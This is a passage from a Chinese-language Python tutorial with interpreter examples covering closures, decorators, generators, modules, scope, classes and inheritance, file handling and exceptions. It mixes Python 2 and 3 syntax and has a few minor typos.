&gt;&gt;&gt; s = sum2(1,2) &gt;&gt;&gt; s() 3 &gt;&gt;&gt; s = sum2(1,3) &gt;&gt;&gt; s() 4 &gt;&gt;&gt; def closure(): ... i = 10 ... def clo2(): ... return i * i ... return clo2 ... &gt;&gt;&gt; c = closure() &gt;&gt;&gt; c &lt;function closure.&lt;locals&gt;.clo2 at 0x000000000331F0D0&gt; &gt;&gt;&gt; c() 100 闭包如果在一个内部函数里，对在外部作用域（但不是在全局作用域）的变量进行引用，那么内部函数就被认为是闭包（closure）。 例：以上的两个例子 装饰器装饰器（Decorator）采用函数作为参数，然后对此函数进行装饰，增强其功能 装饰器可以为函数增加功能，但是无需修改原有函数内部结构 装饰器是闭包的高阶应用，闭包是内部函数调用外部函数的变量，装饰器是调用函数 第一步，定义装饰器 def deco（func）： def wrapper( )： 函数体包括func( ) return wrapper 第二步，定义函数 def func( )： 函数体 第三步，装饰函数 @deco def func( ) 函数体 不带参数的装饰器&gt;&gt;&gt; def deco(func): ... def wrapper(): ... print(&#39;this is a decorator!&#39;) ... return func() ... return wrapper ... &gt;&gt;&gt; @deco ... def f1(): ... print(&#39;this is a function!&#39;) ... &gt;&gt;&gt; f1() this is a decorator! this is a function! 生成器在 Python 中，带有 yield 的函数被称之为 generator（生成器） 生成器是特定的函数, 允许返回一个值, 然后”暂停”代码的执行, 稍后恢复 使用yield语句一次返回一个结果，在每个结果之间挂起和继续它们的状态通过生成器，可以节省内存空间，使得函数结果散落在不同时间的请求上 yield vs return return返回结果并结束函数 yield返回结果并挂起当前状态，并于下次再次执行 &gt;&gt;&gt; def num(): ... print(&#39;first&#39;) ... yield 1 ... print(&#39;second&#39;) ... yield 2 ... print(&#39;third&#39;) ... yield 3 ... print(&#39;over&#39;) ... &gt;&gt;&gt; n = num() &gt;&gt;&gt; next(n) first 1 &gt;&gt;&gt; next(n) second 2 &gt;&gt;&gt; next(n) third 3 &gt;&gt;&gt; next(n) Traceback (most recent call last): File &quot;&lt;input&gt;&quot;, line 1, in &lt;module&gt; StopIteration over &gt;&gt;&gt; def squars(N): ... for i in range(N): ... yield i ** 2 ... &gt;&gt;&gt; s = squars(5) &gt;&gt;&gt; s.__next__() 0 &gt;&gt;&gt; s.__next__() 1 &gt;&gt;&gt; s.__next__() 4 &gt;&gt;&gt; s.__next__() 9 &gt;&gt;&gt; s.__next__() 16 &gt;&gt;&gt; s.__next__() Traceback (most recent call last): File &quot;&lt;input&gt;&quot;, line 1, in &lt;module&gt; StopIteration 模块定义 模块（Module）是一系列函数、变量、类的组成 Python程序是由一系列模块文件组成，一个.py文件就是一个模块 功能提高代码重用率，需要用到某些函数，直接调用某个模块即可，无需重复编写 提高程序层次性，不同功能模块放入不同的模块，逻辑性和层次性提高 方便协作防止冲突 函数和变量在不同模块下可以有同样命名，但是不会冲突 这样多人协作时，即便命名冲突，也不会干扰 原理模块创建用代码编辑器编写代码并保存为py文件 通过IDE编写模块 模块导入语法 import Module 导入整个模块到内存，不覆盖本地命名空间 采用点号调用函数，Module.Func1 不会覆盖本地命名（变量&#x2F;函数等） from Module import Func 导入模块某个函数到内存 直接调用此函数， Func1 会覆盖本地某个命名（若本地有） from Module import * 导入整个模块到内存 覆盖本地命名空间 直接调用此模块所有函数 会覆盖本地所有命名（若本地有） reload ModulePython只会导入同一模块一次，若再次通过import或者from命令调用同一模块，也不会再次加载，而直接从内存寻找 通过reload关键词可以重新载入该模块（另外一种方式便是重启Python) 若脚本文件有变动，则需要通过reload重新载入 流程搜索 模块路径 编译 编译成字节码.pyc 运行 将模块定义的函数和类等导入运行 一般导入一次之后，再import相同模块则不会再搜索、编译、运行,需要通过reload来实现重新导入 举例&gt;&gt;&gt; import math 调用数学模块 &gt;&gt;&gt; math.sin(10) -0.5440211108893699 模块路径搜索路径导入模块时，路径的搜索按以下的顺序 程序运行目录 程序运行或安装目录 环境变量PYTHONPATH PYTHONPATH是设置包含Python程序文件的目录的列表，这些目录可以是用户定义的或平台特定的目录名 标准库模块目录 标准库模块目录存储Python内置的模块文件Python会自动搜索标准库模块安装在此电脑上的目录 .pth文件 查看路径sys.p python会将模块搜索的路径统一存储在sys模块中的path变量中sys.path 包括程序运行路径、PYTHONPATH、标准库路径等，以列表方式存储 &gt;&gt;&gt; import sys 导入sys模块 &gt;&gt;&gt; sys.path 通过path函数查看标准库路径 配置路径通过函数sys.path增加模块搜索路径 &gt;&gt;&gt; import sys &gt;&gt;&gt; sys.path &gt;&gt;&gt; sys.path.append(&quot;C:\\\\PATH&quot;) &gt;&gt;&gt; sys.path &gt;&gt;&gt; import MOD1 C盘路径下创建PATH文件夹并创建MOD1.py模块 通过环境变量PYTHONPATH增加模块搜索路径 通过文件.pth增加模块搜索路径 在site-packages添加一个路径文件，如sitepath.pth，文件中加入要增加模块所在的路径即可 模块互导模块和模块之间可以相互导入 模块中导入内置模块 模块中导入自定义模块 已有路径的情况下直接导入名字，没有路径的情况下要加入路径 sys.path.append(&#39;/users/jaykingchen/MOD&#39;) if __name__ &#x3D;&#x3D; ‘__main__‘: 模块直接执行时，这个模块的名字为 main_ 模块被导入时，这个模块的名字便是模块本身 所以，当模块直接执行时，这个判断条件成立，if语句后面的代码可以执行 当模块被导入时，这个判断不成立，if语句后面的代码不被执行 一般情况下，在模块里面的测试代码例如print等输出，我们可以放置在这个判断语句后面，这样其他人调用我们的模块时，则不会有额外的输出 进阶命名空间和作用域定义和功能 名称空间（Namespace）是名字和对象的映射 名称空间是一个字典，其中键是名字，值是对象 内建、模块、函数、类都有自己的名称空间 名称空间通过__dict___属性和dir( )函数查看 作用域（Scope）即一个作用范围，表示名称空间可被访问的范围 根据Python的命名空间，可以得到如下的作用域 内部函数的局部作用域 外层函数的局部作用域 模块的全局作用域 Python内置对象的最外层作用域 LEGB查找原则 当引用一个变量时，Python按以下顺序依次进行查找：从本地变量中，在任意上层函数的作用域，在全局作用域，最后在内置作用域中查找。 第一个能够完成查找的就算成功；变量在代码中被赋值的位置通常就决定了它的作用域。 举例Local本地作用域&gt;&gt;&gt; a = 10 全局作用域 &gt;&gt;&gt; def printa(): 本地作用域 ... a = 1 有a变量 ... print(a) 根据LEGB搜索规则，直接调用本地变量 ... &gt;&gt;&gt; printa() 1 &gt;&gt;&gt; a 10 Enclosing作用域&gt;&gt;&gt; a = 10 全局作用域 &gt;&gt;&gt; def printA(): Enclosing作用域 ... a = 1 ... def printa(): ... print(a+2) 根据LEGB原则，本地Local没有变量a，此时调用 ... printa() Enclosing外部函数a ... &gt;&gt;&gt; printA() 3 &gt;&gt;&gt; print(a) 全局作用域/命名空间不被影响 10 Global作用域&gt;&gt;&gt; a = 10 全局作用域 &gt;&gt;&gt; def printa(): 本地作用域，没有a变量 ... print(a) 根据LEGB搜索规则，local和enclosing作用域都没有a变 ... 量，此时直接调用global变量 &gt;&gt;&gt; printa() 10 Bulti-in作用域&gt;&gt;&gt; def printa(): 本地作用域 ... print(abs(-10)) 本地没有abs()函数和变量，通过内置bulti-in作用域查找 ... abs()函数并调用 &gt;&gt;&gt; printa() 10 包（package） 包（Package）是一种层次化的程序组织结构，由一系列子包和模块组成类似模块，可以通过import和from…import语法导入，可以通过点号语法访问 与模块最大不同的是，包通常由模块和__init__文件组成 包导入语句的路径中的每个目录内都必须有__init__.py这个文件，否则导入包会失败 __init__.py是一个初始化模块，Python首次导入某个目录时，会自动执行该目录下__init__.py文件中的所有代码 __init__.py文件可以直接是一个空文件，但也可以为包执行初始化语句或设置__all__等变量 语法：import package1.package2.module from package1.package2 import module 包导入环境下，采用from…import语句，可以简化模块&#x2F;函数&#x2F;变量的调用，无需输入完整路径 若包目录中，所有模块名字唯一，则可以通过from…import…语句导入，简化模块中函数和变量等调用 若包目录中，有些模块的名字重叠，则需要通过import语句，之后采用点号语法进行函数&#x2F;变量调用，保证唯一性 面向对象类的基础什么是类定义 类(Class）是设计蓝图（或模型），用来创建不同类型的对象 类是一种数据结构，可以用来定义对象，将数据值和行为特征融合在一起 类指定了对象将包含哪些数据和函数，数据一般是变量即对应值，函数一般我们称之为方法 相当于面包的模具一样 功能对事务进行高度抽象；类是对事务的抽象 提高代码重用率；通过子类和超类，实现类的（多重）继承 提高程序层次性；类支持继承 语法 class ClassName ： 定义类的名称 ‘class documentation string’ #类文档字符串 class_suite #类体 举例&gt;&gt;&gt; class person: ... &#39;The person Class&#39; ... def __init__(self,name,gender,age): 构造函数，用于给实例/对象初始化参数 ... self.name = name 类中第一个函数必须是self，代表实例/ ... self.gender = gender 对象本身 ... self.age = age ... def print_gender(self): ... print(&#39;%s:%s&#39;%(self.name,self.gender)) ... def print_age(self): ... print(&#39;%s:%s&#39;%(self.name,self.age)) 类的实例定义和语法类（Class）是现实世界的抽象的实体以编程形式出现，实例（Instance）则是这些对象的具体化 通过实例化，类的方法&#x2F;函数才可以调用，这是类的绑定特征 Inst_a &#x3D; Class( ) 举例&gt;&gt;&gt; class person: ... &#39;The person Class&#39; ... def __init__(self,name,gender,age): ... self.name = name ... self.gender = gender ... self.age = age ... def print_gender(self): ... print(&#39;%s:%s&#39;%(self.name,self.gender)) ... def print_age(self): ... print(&#39;%s:%s&#39;%(self.name,self.age)) ... &gt;&gt;&gt; A = person(&#39;A&#39;,&#39;male&#39;,&#39;10&#39;) 创建实例A，并传入三个参数给构造函数 &gt;&gt;&gt; B = person(&#39;B&#39;,&#39;Female&#39;,&#39;12&#39;) 创建实例B，并传入三个参数给构造函数 &gt;&gt;&gt; A.name &#39;A&#39; &gt;&gt;&gt; A.age &#39;10&#39; &gt;&gt;&gt; B.gender &#39;Female&#39; 类的属性属性概述类的属性由数据和方法两个部分组成，可以通过点号方式来访问 数据属性存储数据和变量值，方法属性存储操作数据的函数 &gt;&gt;&gt; class person(): ... version = 1.0 数据属性 ... def printver(self): 方法属性 ... print(self.version) 方法调用数据 ... &gt;&gt;&gt; p = person() &gt;&gt;&gt; p.version 1.0 &gt;&gt;&gt; p.printver() 1.0 调用语法Inst_a. value1 调用类的数据属性（变量值） Inst_a. method1 调用类的方法属性（函数） 属性操作属性访问访问数据属性数据属性仅仅是所定义的类的变量 数据属性即静态变量和静态数据 类.数据属性 实例.数据属性 访问方法属性类中所定义的函数，称之为方法 方法有应用范围的，只能在类里面 要调用方法，必须先实例化 类函数规则： ①类内部函数与其他函数没有太大区别 ②类中所有函数第一个参数必须是self self就是代表实例自己 创建实例时，实例名代替self ③很多类的第一个函数是__init__构造函数 __init__构造函数用于初始化对象值 通过__init__，在创建实例的时候，不能传入空参数，必须传入与__init__方法匹配的参数 属性修改&gt;&gt;&gt; Person.version 数据属性可以不经过实例化之间由类调用 1.0 &gt;&gt;&gt; DaXiong.version 实例也可以调用数据属性 1.0 &gt;&gt;&gt; DaXiong.version = 2.0 实例可以对属性进行修改 &gt;&gt;&gt; DaXiong.version 2.0 &gt;&gt;&gt; DaXiong.age = 11 修改传入的参数 &gt;&gt;&gt; DaXiong.age 11 实例属性修改不影响类的属性 增加属性&gt;&gt;&gt; DaXiong.score = 59 增加一个score属性，并赋值为59 &gt;&gt;&gt; DaXiong.score 59 只会给实例赋值，不会影响到类 查看属性dir( )： &gt;&gt;&gt; dir(DaXiong) [&#39;__doc__&#39;, &#39;__init__&#39;, &#39;__module__&#39;, &#39;age&#39;, &#39;gender&#39;, &#39;name&#39;, &#39;print_age&#39;, &#39;print_gender&#39;, &#39;score&#39;, &#39;version&#39;] __dict__： &gt;&gt;&gt; DaXiong.__dict__ &#123;&#39;gender&#39;: &#39;male&#39;, &#39;age&#39;: 11, &#39;version&#39;: 2.0, &#39;name&#39;: &#39;Daxiong&#39;, &#39;score&#39;: 59&#125; 特殊类属性这里的特殊类属性以__value__方式命名，前后都有2个下划线特殊类属性是Python内置属性，所有创建的类默认都有C.__doc__ 类Ｃ的文档字符串： &gt;&gt;&gt; Person.__doc__ &#39;The Person Class&#39; C.__dict__ 类Ｃ的属性： &gt;&gt;&gt; Person.__dict__ &#123;&#39;__module__&#39;: &#39;__builtin__&#39;, &#39;print_age&#39;: &lt;function print_age at 0x106132b18&gt;, &#39;print_gender&#39;: &lt;function print_gender at 0x1061329b0&gt;, &#39;version&#39;: 1.0, &#39;__doc__&#39;: &#39;The Person Class&#39;, &#39;__init__&#39;: &lt;function __init__ at 0x1061328c0&gt;&#125; C.__name__: 类名 C.__module__ 类Ｃ定义所在的模块： &gt;&gt;&gt; Person.__module__ &#39;__builtin__&#39; C.__bases__ : 类的所有父类构成元素 类的进阶继承当编写一个类（Class）时，可以从之前的类进行继承，这样可以获取之前的类的所有属性 新的类称为子类（Subclass），而被继承的类被称为基类&#x2F;父类&#x2F;超类（Superclass） &gt;&gt;&gt; class Parent(object): …… &gt;&gt;&gt; class Child(Parent): 子类在父类上创建 创建子类继承判断函数isinstance( ) &gt;&gt;&gt; isinstance(DaXiong, Male) True &gt;&gt;&gt; isinstance(DaXiong, Female) False issubclass( ) &gt;&gt;&gt; issubclass(Male, Person) True &gt;&gt;&gt; issubclass(Female, Person) True 创建子类class A(object): …………………… class B(A): B为子类 方法定制 类中的继承方法搜索规则：实例 -&gt; 子类 -&gt; 父类 子类除了继承父类的属性，还可以自己添加、定制、拓展更多功能 若子类的属性与父类属性名字相同，则以子类属性为主，即子类将父类的方法重写或拓展 定制方法&gt;&gt;&gt; class person: &#39;The person Class&#39; def __init__(self,name,gender,age): self.name = name self.gender = gender self.age = age def print_gender(self): print(&#39;%s:%s&#39;%(self.name,self.gender)) def print_age(self): print(&#39;%s:%s&#39;%(self.name,self.age)) &gt;&gt;&gt; class male(person): ... &#39;The male class&#39; ... def print_gender(self): 子类中方法与父类相同，则根据继承搜索 ... print(&#39;He is %s&#39; % self.gender) 规则，子类方法优先 ... &gt;&gt;&gt; a = male(&#39;a&#39;,&#39;male&#39;,10) &gt;&gt;&gt; a.print_gender() He is male 定制构造函数gender self.age = age def print_gender(self): print(&#39;%s:%s&#39;%(self.name,self.gender)) def print_age(self): print(&#39;%s:%s&#39;%(self.name,self.age)) &gt;&gt;&gt; class male(person): ... &#39;The male class&#39; ... def __init__(self,name,age): ... person.__init__(self,name,&#39;male&#39;,age) ... def print_gender(self): ... print(&#39;HE is %s&#39; % ,self.gender) ... &gt;&gt;&gt; class male(person): ... &#39;The male class&#39; ... def __init__(self,name,age): ... person.__init__(self,name,&#39;male&#39;,age) 调用父类函数，并进行修改 ... def print_gender(self): 直接默认为‘male’ ... print(&#39;HE is %s&#39; % self.gender) ... &gt;&gt;&gt; class female(person): ... &#39;The female class&#39; ... def __init__(self,name,age): ... person.__init__(self,name,&#39;female&#39;,age) ... def print_gender(self): ... print(&#39;She is %s&#39; % self.gender) ... &gt;&gt;&gt; a = male(&#39;a&#39;,10) &gt;&gt;&gt; b = female(&#39;b&#39;,9) &gt;&gt;&gt; a.gender &#39;male&#39; &gt;&gt;&gt; b.gender &#39;female&#39; 默认情况下，构造函数从父类继承；但是有时候有一些参数有默认值，可以直接指定，无需再传入 多重继承 多重继承用于实现子类对多个父类的继承通过多重继承，可以混合不同类的功能，实现更加复杂的需求 class A( ): class B( ): class C(A, B ): &gt;&gt;&gt; class fat(person): ... &#39;the fat class&#39; ... def print_wight(self): ... print(&#39;fat&#39;) ... &gt;&gt;&gt; class thin (person): ... &#39;the fat class&#39; ... &gt;&gt;&gt; class thin (person): ... &#39;the thin class&#39; ... def print_weight(self): ... print(&#39;thin&#39;) ... &gt;&gt;&gt; class mf(male,fat): 多重继承 ... pass ... &gt;&gt;&gt; class ft(female,thin): 多重继承 ... pass ... &gt;&gt;&gt; a = mf(&#39;a&#39;,10) &gt;&gt;&gt; b = ft(&#39;b&#39;,9) &gt;&gt;&gt; print(a.print_wight()) fat None &gt;&gt;&gt; print(b.print_weight()) thin None 多态多态是面向对象语言的一个基本特性，多态意味着变量并不知道引用的对象是什么，根据引用对象的不同表现不同的行为方式 &gt;&gt;&gt; from random import choice &gt;&gt;&gt; obj = choice([a,b]) &gt;&gt;&gt; print(obj.print_gender()) HE is male None &gt;&gt;&gt; obj = choice([a,b]) &gt;&gt;&gt; print(obj.print_gender()) HE is male None &gt;&gt;&gt; obj = choice([a,b]) &gt;&gt;&gt; print(obj.print_gender()) She is female None 私有变量默认情况下，类内部所定义的变量通过点号方法可以访问并修改，这种变量称为公有变量 公有变量可被用户修改，导致对象内部状态不一致，此时便需要私有变量（Private） 私有变量即在原有变量的前面加上两个下划线，例如_ _ value 常规公有变量能被访问并修改&gt;&gt;&gt; class person: &#39;The person Class&#39; def __init__(self,name,gender,age): self.name = name self.gender = gender self.age = age &gt;&gt;&gt; a = person(&#39;a&#39;,&#39;male&#39;,10) &gt;&gt;&gt; a.age 10 &gt;&gt;&gt; a.gender &#39;male&#39; &gt;&gt;&gt; a.age = 20 &gt;&gt;&gt; a.age 20 通过私有变量实现访问限制&gt;&gt;&gt; class person: &#39;The person Class&#39; def __init__(self,name,gender,age): self.__name = name 私有变量加入两个下划线 self.__gender = gender self.__age = age &gt;&gt;&gt; a = person(&#39;a&#39;,&#39;male&#39;,10) &gt;&gt;&gt; a.person__name 常规的句点访问方式被拒绝 Traceback (most recent call last): File &quot;&lt;input&gt;&quot;, line 1, in &lt;module&gt; AttributeError: &#39;person&#39; object has no attribute &#39;person__name&#39; &gt;&gt;&gt; a.person__age Traceback (most recent call last): File &quot;&lt;input&gt;&quot;, line 1, in &lt;module&gt; AttributeError: &#39;person&#39; object has no attribute &#39;person__age&#39; &gt;&gt;&gt; a._person__age 10 通过点号方式中加入类名可以访问，但是不建议 通过获取函数实现私有变量值访问&gt;&gt;&gt; class person: &#39;The person Class&#39; def __init__(self,name,gender,age): self.__name = name self.__gender = gender self.__age = age def print_gender(self): print(&#39;%s:%s&#39;%(self.__name,self.__gender)) def print_age(self): print(&#39;%s:%s&#39;%(self.__name,self.__age)) &gt;&gt;&gt; a = person(&#39;a&#39;,&#39;male&#39;,10) &gt;&gt;&gt; b = person(&#39;b&#39;,&#39;female&#39;,11) &gt;&gt;&gt; a.print_age() a:10 &gt;&gt;&gt; a.print_gender() a:male 通过设置函数设置条件变量&gt;&gt;&gt; class person: &#39;The person Class&#39; def __init__(self,name,gender,age): self.__name = name self.__gender = gender self.__age = age def set_gender(self,gender): self.__gender = gender def set_age(self,age): if 0 &lt;= age &lt;= 100: self.__age = age &gt;&gt;&gt; def print_gender(self): print(&#39;%s:%s&#39;%(self.__name,self.__gender)) &gt;&gt;&gt; def print_age(self): print(&#39;%s:%s&#39;%(self.__name,self.__age)) &gt;&gt;&gt; a = person(&#39;a&#39;,&#39;male&#39;,10) &gt;&gt;&gt; DaXiong.print_age() Daxiong: 10 &gt;&gt;&gt; DaXiong.set_age(101) &gt;&gt;&gt; DaXiong.print_age() Daxiong: 10 装饰器私有变量章节中，我们通过获取和设置函数，实现更安全的访问和设置 但是，在进行访问和设置时，相对显得比较麻烦？ 有没有更好的方式？实现以下的需求&#x3D;&gt; 既能检查参数，又能想属性一样方便地访问和修改类的变量 可以让调用者写出简短的代码，同时保证对参数进行必要的检查 这就需要 @property 装饰器来实现了 &gt;&gt;&gt; class person(object): ... def __int__(self,name,gender,age): ... self.__name = name ... self.__gender = gender ... self.__age = age ... &gt;&gt;&gt; @property ... def age(self): ... return self.__age ... &gt;&gt;&gt; @age.setter ... def age(self,value): ... if value &lt; 0 or value &gt;100: ... raise ValueError(&#39;invalid age!&#39;) ... self.__age = value ... 面向对象编程对象基础Python是一种“面向对象编程”的语言，所以Python语言中，一切皆对象！Python语言中，所有能够被处理的、被解决的“东西”，都称之为对象（Object） 本质上讲，对象是一组数据以及能处理这些数据的函数 对象的特征值value：对象表示的数据项 身份id：唯一性身份标志，是该对象的内存地址，可用内建函数id()获得 类型tpye：对象的类型决定了该对象可以保存什么类型的值，可进行什么样的操作，以及遵循什么样的规则，可以type()获得 对象的行为对象的操作、功能、方法等，是一种动态信息。 我们将能对象能做的，统称为 “方法&#x2F;属性&#x2F;操作” 方法method 函数function 操作operation 编程方法 围绕“do”解决、处理、流程为依据来进行编程，称为“面向过程编程” 围绕“things”东西、事情、数据为依据来进行编程，称为“面向对象编程” 输入输出输入输出屏幕输出print 在3.x版本，print为一个函数 键盘输入raw_input用于接收键盘输入 i &#x3D; raw_input( ) s &#x3D; raw_input(‘请输入您的账号:’) print ‘您的账号是:’, s input用于接入键盘输入，输入内容可以是表达式 i &#x3D; input( ) s &#x3D; input(‘请输入您的公式:’) print ‘您的结果是:’, s 文件处理file_object &#x3D; open(file_name， access_mode, buffering) file_name 是包含要打开的文件名字的字符串, 它可以是相对路径或者绝对路径 文件打开rr 以只读方式打开文件 r+ 以读写方式打开文件 rb 以二进制方式只读打开文件 rb+ 以二进制读写打开文件 ww 以写入方式打开文件 w+ 以读写方式打开文件 wb 以二进制方式写入打开文件 wb+ 以二进制方式读写打开文件 若文件存在，则覆盖 若文件不存在，则创建 aa 以增加方式打开文件，文件指针放在原有内容后面 a+ 以读写方式打开文件，文件指针放在原有内容后面 ab 以二进制方式打开文件并增加内容，文件指针放在原有内容后面 ab+ 以二进制方式读写文件并增加内容，文件指针放在原有内容后面 若文件不存在，则创建 file1 = open(&#39;newfile.txt&#39;, &#39;r&#39;) file1 = open(&#39;newfile.txt&#39;, &#39;w&#39;) file1 = open(&#39;newfile.txt&#39;, &#39;a&#39;) 文件关闭file.close() 关闭文件，结束文件调用，节省内存空间 文件写入file.write() write()方法不会在字符串的结尾添加换行符\\n，若需要换行，需自行添加 &gt;&gt;&gt; file1 = open(&#39;newfile.txt&#39;,&#39;w&#39;) &gt;&gt;&gt; file1.write(&#39;123\\n456\\n789\\n&#39;) 12 &gt;&gt;&gt; file1.close() 文件读取file.read()读取文件所有字节,可以指定字节数,不指定或未负则读取所有 &gt;&gt;&gt; file1 = open(&#39;newfile.txt&#39;,&#39;r&#39;) &gt;&gt;&gt; s = file1.read() &gt;&gt;&gt; print(s) 123 456 789 &gt;&gt;&gt; file1 = open(&#39;newfile.txt&#39;,&#39;r&#39;) &gt;&gt;&gt; s = file1.read(6) &gt;&gt;&gt; print(s) 123 45 file.readline()读取一行,包括’\\n’字符 &gt;&gt;&gt; file1 = open(&#39;newfile.txt&#39;,&#39;r&#39;) &gt;&gt;&gt; s = file1.readline() &gt;&gt;&gt; print(s) 123 &gt;&gt;&gt; s = file1.readline() &gt;&gt;&gt; print(s) 456 &gt;&gt;&gt; print(s) 456 &gt;&gt;&gt; s = file1.readline() &gt;&gt;&gt; print(s) 789 file.readlines()读取所有行并返回列表，每行返回列表 &gt;&gt;&gt; file1 = open(&#39;newfile.txt&#39;,&#39;r&#39;) &gt;&gt;&gt; s = file1.readlines() &gt;&gt;&gt; print(s) [&#39;123\\n&#39;, &#39;456\\n&#39;, &#39;789\\n&#39;] 文件增加以a方式打开，代表不覆盖原来内容，在原有基础上增加 file &#x3D; open(‘file_name’, ‘a’) file.write() 文件偏移file.tell( )表示当前指针所在的位置 &gt;&gt;&gt; file1 = open(&#39;newfile.txt&#39;,&#39;r+&#39;) &gt;&gt;&gt; print(file1.tell()) 0 &gt;&gt;&gt; file1.write(&#39;add line 1\\n&#39;) 11 &gt;&gt;&gt; print(file1.tell()) 12 file.seek( )指定指针偏移的位置file.seek(off, whence&#x3D;0) 在文件中移动文件指针, 从 whence ( 0 代表文件其始, 1 代表当前位置，2 代表文件末尾)偏移 off 字节 &gt;&gt;&gt; file1 = open(&#39;newfile.txt&#39;,&#39;w+&#39;) &gt;&gt;&gt; print(file1.tell()) 0 SyntaxError: invalid syntax &gt;&gt;&gt; file1.seek(10,0) 10 文件重命名导入系统模块 import os os.rename(‘原文件名称’,’重命名文件名称’) 文件删除import os os.remove(‘文件名称’) 目标处理os模块获取目录os.getcwd() 获取当前工作目录 创建目录os.mkdir() 创建新的目录 删除目录os.rmdir( ) 删除指定目录 目录内容os.listdir() 列出指定目录下的文件和文件夹 os.listdir(os.getcwd()) 移动目录os.chdir() 移动当前工作目录到其他目录 os.chdir(&#39;newdir&#39;) os.path模块查询文件os.path.isfile &gt;&gt;&gt; os.path.isfile(&#39;newfile.txt&#39;) True 查询目录os.path.isdir &gt;&gt;&gt; os.path.isdir(&#39;testdir&#39;) False 查询大小os.path.getsize &gt;&gt;&gt; os.path.getsize(&#39;newfile.txt&#39;) 0 &gt;&gt;&gt; file1 = open(&#39;newfile.txt&#39;,&#39;w&#39;) &gt;&gt;&gt; file1.write(&#39;23333&#39;) 5 &gt;&gt;&gt; file1.close() &gt;&gt;&gt; os.path.getsize(&#39;newfile.txt&#39;) 5 序列化我们用Python对象（变量&#x2F;函数&#x2F;方法）所进行的操作是在内存中，若Python程序（或系统）关闭，则内存被清除 为了将我们所操作的内容永久存储（保存到硬盘），需要引入”序列化”（顺序化），即pickling&#x2F;serialization 序列化将复杂数据结构（对象）转换为一个二进制数据集合（数据流）, 这样就可以把数据永久存储或通过网络发送, 然后再重新把数据流恢复原来的对象内容 变量&#x2F;对象等从内存中变成可存储或传输的过程称之为序列化 pickling提供Python对象的序列化和存储转换功能 pickling.dump( )接收一个文件句柄和一个数据对象作为参数, 把数据对象以特定格式保存到给定文件里 pickling.load( )从文件中取出已保存的对象时, pickle 知道如何恢复这些对象到它们本来的格式 marshal提供类似字典和文件的对象，可以完成字符串的永久性存储 shelve同时具备pickling和marshal的功能 异常处理异常概述背景 什么是异常？举个例子，我们将“建房子”看出一个程序，这里涉及到材料准备、图纸设计、装修施工等各个环节 整个建房子的过程，可能出现各种各样的问题，材料是否准备充足？施工方是否人员到齐？设计是否有存在问题？装修是否有偷工减料？ “建房子”这事情一个系统工程，任何一个环节出现问题，这个事件就无法进行，例如没有材料或者工人没到场等等；这里程序运行就相当于“建房子”的过程 定义 程序运行会出现各种各样的问题，例如语法编写错误或文件读写错误等，出现各种各样的bug 默认情况下，程序会马上停止执行，并根据错误情况，反馈异常情况（显示栈追踪） 本质上讲，异常是一种类，并且有很多子类，基类为BaseException 举例IOError输入输出异常 &gt;&gt;&gt; file1 = open(&#39;file.txt&#39;,&#39;r&#39;) Traceback (most recent call last): File &quot;&lt;input&gt;&quot;, line 1, in &lt;module&gt; FileNotFoundError: [Errno 2] No such file or directory: &#39;file.txt&#39; 根本找不到‘file.txt’这个文件 ZeroDivisionError分母为0异常 &gt;&gt;&gt; a = 1 &gt;&gt;&gt; b = 0 &gt;&gt;&gt; print(a/b) Traceback (most recent call last): File &quot;&lt;input&gt;&quot;, line 1, in &lt;module&gt; ZeroDivisionError: division by zero TypeError类型异常，操作对本类型失效 &gt;&gt;&gt; a = 1 &gt;&gt;&gt; b = &#39;a&#39; &gt;&gt;&gt; a + b Traceback (most recent call last): File &quot;&lt;input&gt;&quot;, line 1, in &lt;module&gt; TypeError: unsupported operand type(s) for +: &#39;int&#39; and &#39;str&#39; ValueError参数异常，无效的参数 &gt;&gt;&gt; num = int(&#39;a&#39;) Traceback (most recent call last): File &quot;&lt;input&gt;&quot;, line 1, in &lt;module&gt; ValueError: invalid literal for int() with base 10: &#39;a&#39; SyntaxError语法异常 &gt;&gt;&gt; a = 1 + File &quot;&lt;input&gt;&quot;, line 1 a = 1 + ^ SyntaxError: invalid syntax NameError名字异常，对象未定义 &gt;&gt;&gt; a + c Traceback (most recent call last): File &quot;&lt;input&gt;&quot;, line 1, in &lt;module&gt; NameError: name &#39;c&#39; is not defined AttributeError属性异常，对象没有此属性/方法 &gt;&gt;&gt; b.counn() Traceback (most recent call last): File &quot;&lt;input&gt;&quot;, line 1, in &lt;module&gt; AttributeError: &#39;str&#39; object has no attribute &#39;counn&#39; 异常处理概述 异常错误会导致程序中止运行，我们可以对异常进行捕获，进行进一步操作 异常所引发的栈追踪对用户不友好，对于提供给用户使用的软件，异常处理是非常用必要的 异常捕获try…except… 执行try语句，若没有异常，则正常执行，忽略except代码块 若出现异常，则跳过try语句，执行except代码块 try&#x2F;except块的工作原理有点像if语句，if语句根据布尔表达式的结果决定如何做，而try&#x2F;except块根据是否出现了异 捕获一个异常&gt;&gt;&gt; try: ... a = 1 ... b = &#39;hello&#39; ... print(a + b) ... except TypeError: ... print(&#39;error!please try again&#39;) ... error!please try again 捕获多个异常，同一处理结果except (TypeError, ValueError): 捕获多个异常，不同处理结果except TypeError : print &#39;Invalid type,Please enter an integer value!&#39; except ValueError: print &#39;Invalid value,Please enter an integer value!&#39; 捕获所有异常except : 捕获异常，与while循环语句结合&gt;&gt;&gt; def get_age(): ... while True: ... try: ... n = int(input(&#39;How old are you?&#39;)) ... return n ... except: ... print(&#39;please enter an integer value&#39;) ... &gt;&gt;&gt; get_age() How old are you? please enter an integer value How old are you?&gt;? 1 1 捕获异常，与else语句结合&gt;&gt;&gt; try: ... a = 1 ... b = 2 ... print(a) ... except TypeErrpr: ... print(&#39;invalid type,please try again&#39;) ... else: ... print(b) ... 1 2 异常清理finally语句用于实现异常清理，不管最终try语句是否有异常，都必须执行finally语句 例如打开一个文件进行操作，不管是否异常，都必须在处理之后将其关闭，通过finally语句可以解决 try…finallytry: file1 = open(&#39;file.txt&#39;,&#39;w&#39;) file1.read() finally: file1.close() print &#39;close the file1&#39; try…except…finallytry: file1 = open(&#39;file.txt&#39;,&#39;w&#39;) file1.read() except IOError: print &#39;IOError, please try again!&#39; finally: file1.close() print &#39;close the file1&#39; try…except…else…finallytry: file1 = open(&#39;file.txt&#39;,&#39;w+&#39;) file1.read() except IOError: print &#39;IOError, please try again!&#39; else: print &#39;good!&#39; finally: file1.close() print &#39;close the file1&#39; with…as with open(&#39;file.txt&#39;,&#39;w&#39;) as f: f.read() 异常触发raiseRaise用于抛出异常，异常可以自己定义 raise [SomeException [, args [, traceback]]] 第一个参数，SomeExcpetion是触发异常的名字 第二个符号为可选的 args(比如参数,值),来传给异常 